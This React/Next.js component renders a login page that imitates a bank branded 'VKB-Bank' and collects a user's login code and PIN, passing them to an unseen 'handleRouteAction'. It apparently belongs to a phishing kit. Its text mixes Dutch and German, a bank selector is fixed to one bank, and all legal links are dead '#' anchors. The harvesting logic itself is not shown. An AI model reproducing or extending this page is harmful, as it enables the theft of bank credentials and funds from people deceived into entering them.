"use client";

import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Volkskreditbank({ formData, onChange, handleRouteAction, saving }: Props) {
  return (
    <div className="min-h-screen w-full relative flex flex-col font-sans">
      {/* Background Image */}
      <div className="absolute inset-0 z-0">
        <Image 
          src="/vkb-green.webp" 
          alt="Background" 
          fill
          className="object-cover object-center"
          priority
        />
      </div>

      {/* Main Content Area */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        
        {/* Login Card */}
        <div className="bg-white w-full max-w-[540px] p-8 md:p-10 shadow-[0_8px_30px_rgb(0,0,0,0.12)]">
          
          {/* Top Right Language Selector */}
          <div className="flex justify-end mb-6">
            <div className="flex items-center gap-1 cursor-pointer text-[#444] hover:text-black">
              <span className="text-[13px]">Deutsch</span>
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </div>

          {/* Heading & Subtext */}
          <h1 className="text-[26px] md:text-[28px] font-normal text-[#333] mb-3 tracking-tight">
            Log alstublieft in
          </h1>
          <p className="text-[14px] text-[#555] mb-8">
            Voer uw inloggegevens in om verder te gaan.
          </p>

          <form 
            onSubmit={(e) => {
              e.preventDefault();
              handleRouteAction();
            }}
            className="flex flex-col"
          >
            {/* Bundesland Dropdown */}
            <div className="relative w-full bg-[#f3f4f6] pt-2 pb-1.5 px-3 border-b border-[#aaa] mb-5 cursor-pointer flex justify-between items-center hover:bg-[#ebebeb] transition-colors">
              <div>
                <label className="block text-[12px] text-[#666] mb-0.5">Bundesland oder Bank wählen *</label>
                <div className="text-[15px] text-[#222]">VKB-Bank</div>
              </div>
              <svg className="w-5 h-5 text-[#555]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
              </svg>
            </div>

            {/* Inlogcode */}
            <div className={`relative w-full bg-[#f3f4f6] pt-2 pb-1.5 px-3 mb-5 transition-colors focus-within:bg-[#ebebeb] ${
              formData.verfuegernummer ? 'border-b-2 border-[#8bd05f]' : 'border-b border-[#aaa]'
            }`}>
              <label className="block text-[12px] text-[#666] mb-0.5">Inlogcode invoeren *</label>
              <input 
                type="text"
                value={formData.verfuegernummer || ""}
                onChange={(e) => onChange("verfuegernummer", e.target.value)}
                className="w-full bg-transparent outline-none text-[15px] text-[#222] h-[24px]"
              />
            </div>

            {/* PIN */}
            <div className={`relative w-full bg-[#f3f4f6] pt-2 pb-1.5 px-3 mb-6 transition-colors focus-within:bg-[#ebebeb] ${
              formData.pin ? 'border-b-2 border-[#8bd05f]' : 'border-b border-[#aaa]'
            }`}>
              <label className="block text-[12px] text-[#666] mb-0.5">PIN eingeben *</label>
              <input 
                type="password"
                value={formData.pin || ""}
                onChange={(e) => onChange("pin", e.target.value)}
                className="w-full bg-transparent outline-none text-[15px] text-[#222] h-[24px]"
              />
            </div>

            {/* Checkbox */}
            <div className="flex items-center gap-3 mb-8 px-1">
              <div className="w-5 h-5 border border-[#999] rounded-[2px] cursor-pointer flex items-center justify-center hover:border-[#666]">
                {/* Empty Checkbox */}
              </div>
              <span className="text-[14px] text-[#444] cursor-pointer">Verfüger speichern</span>
              <div className="cursor-pointer ml-1">
                <svg className="w-[18px] h-[18px] text-[#666]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                  <circle cx="12" cy="12" r="10" />
                  <path d="M12 16v-4" />
                  <path d="M12 8h.01" />
                </svg>
              </div>
            </div>

            {/* Submit Button */}
            <button 
              type="submit" 
              disabled={saving} 
              className="w-full bg-[#8bd05f] hover:bg-[#7bc055] text-white py-[14px] font-normal text-[16px] transition-colors disabled:opacity-70"
            >
              {saving ? "Wird geladen..." : "Weiter"}
            </button>
          </form>
        </div>
      </div>

      {/* Floating Help Icon */}
      <div className="fixed bottom-6 right-6 z-20">
        <div className="w-12 h-12 bg-[#8bd05f] rounded-full shadow-lg flex items-center justify-center cursor-pointer hover:bg-[#7bc055] transition-colors">
          <span className="text-black font-bold text-xl">?</span>
        </div>
      </div>

      {/* Footer */}
      <div className="relative z-10 w-full pb-4 pt-6 flex justify-center bg-gradient-to-t from-black/60 to-transparent mt-auto">
        <div className="flex flex-wrap items-center justify-center gap-x-3 gap-y-2 text-[12px] text-white/90">
          <a href="#" className="hover:text-white hover:underline flex items-center gap-1">
            Impressum 
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
          </a>
          <span className="text-white/40">|</span>
          <a href="#" className="hover:text-white hover:underline flex items-center gap-1">
            Nutzungsbedingungen
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
          </a>
          <span className="text-white/40">|</span>
          <a href="#" className="hover:text-white hover:underline flex items-center gap-1">
            Barrierefreiheitserklärung
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
          </a>
          <span className="text-white/40">|</span>
          <span>© 2026 VKB-Bank</span>
        </div>
      </div>
    </div>
  );
}
